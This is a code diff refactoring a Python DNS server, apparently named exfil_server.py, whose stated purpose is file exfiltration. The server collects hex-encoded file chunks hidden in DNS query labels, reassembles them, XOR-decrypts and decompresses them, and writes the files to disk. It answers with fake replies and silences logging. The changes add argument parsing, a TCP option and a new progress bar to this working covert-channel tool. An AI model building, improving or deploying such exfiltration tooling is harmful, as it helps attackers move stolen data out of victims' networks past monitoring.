@@ -1,49 +1,43 @@
+import argparse
 from dnslib import DNSRecord, DNSHeader
-from dnslib.server import DNSServer, DNSHandler, BaseResolver
+from dnslib.server import DNSServer, BaseResolver
 import binascii
 import gzip
 import sys
 from datetime import datetime
 
 def color(string, color=None):
-    attr = []
-    # bold
-    attr.append('1')
-    
+    colors = {
+        'red': '31',
+        'green': '32',
+        'blue': '34',
+    }
+
+    attr = ['1']  # bold
+
     if color:
-        if color.lower() == "red":
-            attr.append('31')
-        elif color.lower() == "green":
-            attr.append('32')
-        elif color.lower() == "blue":
-            attr.append('34')
-        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
+        return f'\x1b[{attr[0]};{colors[color]}m{string}\x1b[0m'
 
+    if string.strip().startswith('[!]'):
+        return f'\x1b[{attr[0]};{colors["red"]}m{string}\x1b[0m'
+    elif string.strip().startswith('[+]'):
+        return f'\x1b[{attr[0]};{colors["green"]}m{string}\x1b[0m'
+    elif string.strip().startswith('[?]'):
+        return f'\x1b[{attr[0]};{colors["blue"]}m{string}\x1b[0m'
+    elif string.strip().startswith('[*]'):
+        return f'\x1b[{attr[0]}m{string}\x1b[0m'
     else:
-        if string.strip().startswith("[!]"):
-            attr.append('31')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[+]"):
-            attr.append('32')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[?]"):
-            attr.append('33')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        elif string.strip().startswith("[*]"):
-            attr.append('34')
-            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
-        else:
-            return string
+        return string
 
-def progress(count, total, status=''):
-    bar_len = 60
-    filled_len = int(round(bar_len * count / float(total)))
-
-    percents = round(100.0 * count / float(total), 1)
-    bar = '=' * filled_len + '-' * (bar_len - filled_len)
-
-    sys.stdout.write('[%s] %s%s ...%s\r' % (bar, percents, '%', status))
-    sys.stdout.flush() 
+def print_progress_bar(iteration, total, prefix='', suffix='', decimals=1, length=60, fill='█'):
+    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
+    filled_length = int(length * iteration // total)
+    bar = fill * filled_length + '-' * (length - filled_length)
+    sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}', )
+    sys.stdout.flush()
+    if iteration == total:
+        sys.stdout.write('\n')
+        sys.stdout.flush()
 
 class DataResolver(BaseResolver):
     def __init__(self, password):
@@ -64,7 +58,7 @@ class DataResolver(BaseResolver):
     def resolve(self, request, handler):
         qname = request.q.qname
         labels = str(qname).split('.')
-        
+
         # Simulate an NXDOMAIN response
         reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
 
@@ -81,7 +75,7 @@ class DataResolver(BaseResolver):
 
         if file_key not in self.data_store:
             self.data_store[file_key] = [None] * int(number_of_chunks)  # Pre-allocate list for all chunks
-            print(color(f"[*] Reception of new file {file_key} initiated!"))
+            print(color(f"¨\n[*] Reception of new file {file_key} initiated!"))
 
         # Extract chunk ID and hex-encoded chunks
         chunk_id = int(labels[0])
@@ -89,12 +83,12 @@ class DataResolver(BaseResolver):
         hex_data = ''.join(hex_chunks)
         self.data_store[file_key][chunk_id] = hex_data
 
-        progress(chunk_id, number_of_chunks, f"Receiving file {file_key}...")
-        if chunk_id == int(number_of_chunks) -1:
-            chunks=self.data_store[file_key]
+        print_progress_bar(chunk_id + 1, int(number_of_chunks), prefix=f'Receiving file {file_key}:', suffix='Complete', length=50)
+        if chunk_id == int(number_of_chunks) - 1:
+            chunks = self.data_store[file_key]
             print(color(f"\n[+] Transfer of {file_key} complete!"))
             if None in chunks:
-                print(color(f"[!] Missing chunks for {file_key}, file will not be written.\n"))
+                print(color(f"\n[!] Missing chunks for {file_key}, file will not be written."))
             else:
                 try:
                     encrypted_data = bytearray.fromhex(''.join(chunks))
@@ -109,10 +103,10 @@ class DataResolver(BaseResolver):
                         decompressed_output_file = output_file[:-3]  # Remove .gz extension
                         with open(decompressed_output_file, 'wb') as f:
                             f.write(decompressed_data)
-                        print(color(f"[+] Data written to {file_key}\n"))
+                        print(color(f"\n[+] Data written to {file_key}"))
 
                 except (binascii.Error, ValueError):
-                    print(color(f"[!] Failed to decode data for {file_key}\n"))
+                    print(color(f"\n[!] Failed to decode data for {file_key}"))
 
         return reply
 
@@ -123,21 +117,26 @@ class NoOpLogger:
     log_recv = log_send = log_request = log_reply = log_truncated = log_error = log_data = log_pass
 
 if __name__ == "__main__":
-    if len(sys.argv) != 3:
-        print("Usage: python3 exfil_server.py <dns_server_ip> <password>")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description="DNS server for file exfiltration.")
+    parser.add_argument("dns_server_ip", help="IP address of the DNS server")
+    parser.add_argument("password", help="Password for XOR encryption/decryption")
+    parser.add_argument("--use_tcp", action="store_true", help="Use TCP instead of UDP")
+    
+    args = parser.parse_args()
+    
+    dns_server_ip = args.dns_server_ip
+    password = args.password
+    use_tcp = args.use_tcp
 
-    dns_server_ip = sys.argv[1]
-    password = sys.argv[2]
     logger = NoOpLogger()  # Use the no-op logger to suppress output
     resolver = DataResolver(password)
-    server = DNSServer(resolver, port=53, address=dns_server_ip, logger=logger, tcp=False)
+    server = DNSServer(resolver, port=53, address=dns_server_ip, logger=logger, tcp=use_tcp)
     
     try:
         server.start_thread()
-        print(color("[+] DNS server started. Press Ctrl+C to stop."))
+        print(color("[+] DNS server started. Press Ctrl+C to stop.\n"))
         while True:
             pass
     except KeyboardInterrupt:
-        print(color("[!] Stopping server..."))
+        print(color("\n[!] Stopping server..."))
         server.stop()
